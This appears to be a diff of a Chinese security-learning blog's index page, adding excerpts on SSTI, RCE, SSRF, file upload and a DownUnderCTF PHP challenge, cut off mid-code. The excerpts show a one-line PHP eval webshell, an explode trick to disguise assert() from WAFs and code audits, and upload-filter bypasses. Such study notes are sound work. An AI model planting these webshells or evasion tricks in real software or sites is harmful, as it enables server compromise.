@@ -59,7 +59,7 @@
       
 
 
-<div class="overlay" style="background: #b2aec6;"></div>
+<div class="overlay" style="background: #4d4d4d;background: url('/img/background1.jpg') no-repeat ;"></div>
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
@@ -136,7 +136,7 @@
       
       
 <nav id="mobile-nav">
-  	<div class="overlay js-overlay" style="background: #b2aec6"></div>
+  	<div class="overlay js-overlay" style="background: #4d4d4d"></div>
 	<div class="btnctn js-mobile-btnctn">
   		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
 	</div>
@@ -212,6 +212,521 @@
           </div>
           <div id="js-content" class="content-ll">
             
+
+  
+    <article id="post-ssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/04/26/ssti/" target="_blank">ssti</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/04/26/ssti/" class="archive-article-date">
+        <time datetime="2025-04-26T04:59:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-26</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="ssti模板注入"><a href="#ssti模板注入" class="headerlink" title="ssti模板注入"></a>ssti模板注入</h1><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>服务端接收了用户的恶意输入后，未经任何处理就将其作为web应用模板内容的一部分，模板引擎<strong>在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句</strong>，因而可能导致了敏感信息泄露，代码执行，GetShell等问题。其影响范围主要取决于模板引擎的复杂性。</p>
+<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
+<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
+    
+    <a class="article-more-a" href="/2025/04/26/ssti/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/04/26/ssti/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-RCE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/04/11/RCE/" target="_blank">RCE</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/04/11/RCE/" class="archive-article-date">
+        <time datetime="2025-04-11T08:42:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-11</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="RCE-远程代码执行"><a href="#RCE-远程代码执行" class="headerlink" title="RCE(远程代码执行)"></a>RCE(远程代码执行)</h1><h4 id="rce漏洞："><a href="#rce漏洞：" class="headerlink" title="rce漏洞："></a>rce漏洞：</h4><p>在web应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或命令执行漏洞；</p>
+<h2 id="常见RCE漏洞函数"><a href="#常见RCE漏洞函数" class="headerlink" title="常见RCE漏洞函数"></a>常见RCE漏洞函数</h2><h3 id="远程命令执行（ping）函数："><a href="#远程命令执行（ping）函数：" class="headerlink" title="远程命令执行（ping）函数："></a>远程命令执行（ping）函数：</h3><p><strong>system()：将字符串作为OS命令执行，返回执行结果；</strong></p>
+<p>语法为<code>system(string $command, int &amp;$return var = ?)</code>，command: 执行 command 参数所指定的命令常用参数并且输出执行结果，如果提供 return var 参数，则外部命令执行后的返回状态将会被设置到此变量中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：system(&#x27;ls&#x27;)直接返回当前文件下的目录</span><br></pre></td></tr></table></figure>
+
+<p>exec()：将字符串作为OS命令执行，只返回执行结果的最后一行（约等于无回显；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：exec(&quot;cat/flag&quot;) 无回显</span><br></pre></td></tr></table></figure>
+
+<p>shell_exec() &#x2F; 反引号&#96;&#96;：将字符串作为OS命令执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：shell_exec(ls) / `ls` 无回显，用echo/print输出结果</span><br></pre></td></tr></table></figure>
+
+<p>passthru()：将字符串作为OS命令执行，能回显，system()平替；</p>
+<p>pcntl_exec()：在当前进程空间执行指定程序；</p>
+<p>popen() &#x2F; proc_open()：打开进程文件指针；</p>
+<h3 id="远程代码执行（evel）函数："><a href="#远程代码执行（evel）函数：" class="headerlink" title="远程代码执行（evel）函数："></a>远程代码执行（evel）函数：</h3><p><strong>eval() &#x2F; assert()：将字符串作为php代码执行；</strong></p>
+<p>preg_replace()：正则匹配替换字符串；</p>
+<p>create_function()：主要创建匿名函数；</p>
+<p>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数参数；</p>
+<p>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p>
+<h3 id="assert-GET-s-等价于eval-GET-s-能执行任意php代码"><a href="#assert-GET-s-等价于eval-GET-s-能执行任意php代码" class="headerlink" title="assert($_GET[&#39;s&#39;]);等价于eval($_GET[&#39;s&#39;]),能执行任意php代码"></a><code>assert($_GET[&#39;s&#39;]);等价于eval($_GET[&#39;s&#39;]),能执行任意php代码</code></h3><p>例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;a#s#s#e#r#t&quot;</span>; <span class="comment">// 拼的是 assert()</span></span><br><span class="line"><span class="variable">$poc_1</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>, <span class="variable">$poc</span>); </span><br><span class="line"><span class="variable">$poc_2</span> = <span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; <span class="comment">// &quot;assert&quot;</span></span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]); <span class="comment">// 即 assert($_GET[&#x27;s&#x27;]);</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>用#和explode断开再拼接assert，绕过WAF和代码审计检测</strong></p>
+<p>然后如果访问这个php界面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://victim.com/vuln.php?s=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>结果等价于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/04/11/RCE/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-SSRF服务器端请求伪造" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" target="_blank">SSRF服务器端请求伪造</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="archive-article-date">
+        <time datetime="2025-04-07T15:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-07</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="SSRF服务器端请求伪造"><a href="#SSRF服务器端请求伪造" class="headerlink" title="SSRF服务器端请求伪造"></a>SSRF服务器端请求伪造</h1><p>SSRF形成原因是服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p>
+<p><strong>利用：</strong></p>
+<p><strong>主要用来进行内网探测，也可以说是内网信息收集，存活主机和开放端口。</strong></p>
+<ul>
+<li>对外网服务器所在的内网进行端口扫描，获取一些服务的banner信息（如mysql版本等</li>
+<li>有时候可攻击运行在内网或本地的应用程序，如通过ssrf给内网的redis写定时任务，实现反弹shell</li>
+<li>用file协议读取本地文件</li>
+<li>用各种伪协议进行探测：http，file，dict，gopher等</li>
+<li>攻击内外网的web应用，如structs2，sql注入等</li>
+</ul>
+    
+    <a class="article-more-a" href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-文件上传" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" target="_blank">文件上传</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="archive-article-date">
+        <time datetime="2025-02-12T15:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>web的一个管理工具，可以对web服务器进行操作的权限</p>
+<p>php中最经典的webshell是：<code>&lt;?php eval($_post[&#39;cmd&#39;]);?&gt;</code>（一句话木马）</p>
+<p>注：eval($code) 是把字符串$code作为php代码执行</p>
+<p>工具：中国蚁剑</p>
+<h3 id="php中的文件上传"><a href="#php中的文件上传" class="headerlink" title="php中的文件上传"></a>php中的文件上传</h3><h4 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h4><p>超全局变量<code>$_FILES</code>，它是一个数组，其包含了所有上传的文件信息</p>
+<p>例如上传一个表单的name属性值为file，即<code>&lt;input name=&quot;file&quot; type=&quot;file&quot; /&gt;</code></p>
+<h5 id="FILES数组内容："><a href="#FILES数组内容：" class="headerlink" title="$_FILES数组内容："></a>$_FILES数组内容：</h5><h6 id="1-FILES-file-name"><a href="#1-FILES-file-name" class="headerlink" title="1.$_FILES[&#39;file&#39;][&#39;name&#39;]"></a>1.<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code></h6><h6 id="2-FILES-file-type"><a href="#2-FILES-file-type" class="headerlink" title="2.$_FILES[&#39;file&#39;][&#39;type&#39;]"></a>2.<code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code></h6><h6 id="3-FILES-file-size"><a href="#3-FILES-file-size" class="headerlink" title="3.$_FILES[&#39;file&#39;][&#39;size&#39;]"></a>3.<code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code></h6><h6 id="4-FILES-file-tmp-name-文件被上传后在服务端存储的临时文件名-在请求结束后该临时文件会被删除"><a href="#4-FILES-file-tmp-name-文件被上传后在服务端存储的临时文件名-在请求结束后该临时文件会被删除" class="headerlink" title="4.$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]文件被上传后在服务端存储的临时文件名, 在请求结束后该临时文件会被删除"></a>4.<code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>文件被上传后在服务端存储的临时文件名, 在请求结束后该临时文件会被删除</h6><h6 id="5-FILES-file-error-错误代码"><a href="#5-FILES-file-error-错误代码" class="headerlink" title="5.$_FILES[&#39;file&#39;][&#39;error&#39;]错误代码"></a>5.<code>$_FILES[&#39;file&#39;][&#39;error&#39;]</code>错误代码</h6><p>如果多文件上传，则上面变量会变成一个数组</p>
+<p>如<code>$_FILES[&#39;file&#39;][&#39;name&#39;][0]</code>，<code>$_FILES[&#39;file&#39;][&#39;name&#39;][1]</code></p>
+<p>稍微写写uplode-labss靶场的题解</p>
+<h6 id="1-前端拦截绕过"><a href="#1-前端拦截绕过" class="headerlink" title="1.前端拦截绕过"></a>1.前端拦截绕过</h6><p>一句话木马<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>改成1.jpg上传再在bp改成1.php就行</p>
+<h6 id="2-content-type绕过"><a href="#2-content-type绕过" class="headerlink" title="2.content-type绕过"></a>2.content-type绕过</h6><p>后端拦截，bp能抓到包，正常上传1.php再改content-type改成能通过的就行</p>
+    
+    <a class="article-more-a" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-php" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2025/02/08/php/" target="_blank">php</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2025/02/08/php/" class="archive-article-date">
+        <time datetime="2025-02-08T04:30:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-08</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="php中的文件上传"><a href="#php中的文件上传" class="headerlink" title="php中的文件上传"></a>php中的文件上传</h2><h4 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h4><p>超全局变量<code>$_FILES</code>，它是一个数组，其包含了所有上传的文件信息</p>
+<p>例如上传一个表单的name属性值为file，即<code>&lt;input name=&quot;file&quot; type=&quot;file&quot; /&gt;</code></p>
+<h5 id="FILES数组内容："><a href="#FILES数组内容：" class="headerlink" title="$_FILES数组内容："></a>$_FILES数组内容：</h5><h6 id="1-FILES-file-name"><a href="#1-FILES-file-name" class="headerlink" title="1.$_FILES[&#39;file&#39;][&#39;name&#39;]"></a>1.<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code></h6><h6 id="2-FILES-file-type"><a href="#2-FILES-file-type" class="headerlink" title="2.$_FILES[&#39;file&#39;][&#39;type&#39;]"></a>2.<code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code></h6><h6 id="3-FILES-file-size"><a href="#3-FILES-file-size" class="headerlink" title="3.$_FILES[&#39;file&#39;][&#39;size&#39;]"></a>3.<code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code></h6><h6 id="4-FILES-file-tmp-name-文件被上传后在服务端存储的临时文件名-在请求结束后该临时文件会被删除"><a href="#4-FILES-file-tmp-name-文件被上传后在服务端存储的临时文件名-在请求结束后该临时文件会被删除" class="headerlink" title="4.$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]文件被上传后在服务端存储的临时文件名, 在请求结束后该临时文件会被删除"></a>4.<code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>文件被上传后在服务端存储的临时文件名, 在请求结束后该临时文件会被删除</h6><h6 id="5-FILES-file-error-错误代码"><a href="#5-FILES-file-error-错误代码" class="headerlink" title="5.$_FILES[&#39;file&#39;][&#39;error&#39;]错误代码"></a>5.<code>$_FILES[&#39;file&#39;][&#39;error&#39;]</code>错误代码</h6><p>如果多文件上传，则上面变量会变成一个数组</p>
+<p>如<code>$_FILES[&#39;file&#39;][&#39;name&#39;][0]</code>，<code>$_FILES[&#39;file&#39;][&#39;name&#39;][1]</code></p>
+<h2 id="例：downunderCTF中的philtered"><a href="#例：downunderCTF中的philtered" class="headerlink" title="例：downunderCTF中的philtered"></a>例：downunderCTF中的philtered</h2><p>以此题的源码为例，详细解读php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="string">&#x27;information.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data_folder</span> = <span class="string">&#x27;data/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="comment">// idk if we would need to load files from other directories or nested directories, but better to keep it flexible if I change my mind later</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$allow_unsafe</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// These terms will be philtered out to prevent unsafe file access</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blacklist</span> = [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">contains_blacklisted_term</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;allow_unsafe) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;blacklist <span class="keyword">as</span> <span class="variable">$term</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>, <span class="variable">$term</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">assign_props</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>)) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$subKey</span> =&gt; <span class="variable">$subValue</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>, <span class="variable">$subKey</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contains_blacklisted_term</span>(<span class="variable">$subValue</span>)) &#123;</span><br><span class="line">                            <span class="variable">$subValue</span> = <span class="string">&#x27;philtered.txt&#x27;</span>; <span class="comment">// Default to a safe file if blacklisted term is found</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;<span class="variable">$subKey</span> = <span class="variable">$subValue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">contains_blacklisted_term</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                    <span class="variable">$value</span> = <span class="string">&#x27;philtered.txt&#x27;</span>; <span class="comment">// Default to a safe file if blacklisted term is found</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;config-&gt;data_folder . <span class="variable">$this</span>-&gt;config-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Such elegance</span></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">FileLoader</span>(); </span><br><span class="line"><span class="variable">$loader</span>-&gt;<span class="title function_ invoke__">assign_props</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/layout.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&lt;&lt;&lt;HTML</span></span><br><span class="line"><span class="string">&lt;nav style=&quot;margin-bottom:2em;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt; |</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;aboutus.php&quot;&gt;About Us&lt;/a&gt; |</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;contact.php&quot;&gt;Contact&lt;/a&gt; |</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;gallery.php&quot;&gt;Gallery&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/nav&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;Welcome to Philtered&lt;/h2&gt;</span></span><br><span class="line"><span class="string">HTML</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> .= <span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$loader</span>-&gt;<span class="title function_ invoke__">load</span>() . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> .= <span class="string">&quot;&lt;h3&gt;About Us&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$loader</span>-&gt;config-&gt;path = <span class="string">&#x27;aboutus.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$loader</span>-&gt;<span class="title function_ invoke__">load</span>() . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> .= <span class="string">&quot;&lt;h3&gt;Our Values&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$loader</span>-&gt;config-&gt;path = <span class="string">&#x27;our-values.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$loader</span>-&gt;<span class="title function_ invoke__">load</span>() . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> .= <span class="string">&lt;&lt;&lt;HTML</span></span><br><span class="line"><span class="string">&lt;h3&gt;Contact&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">    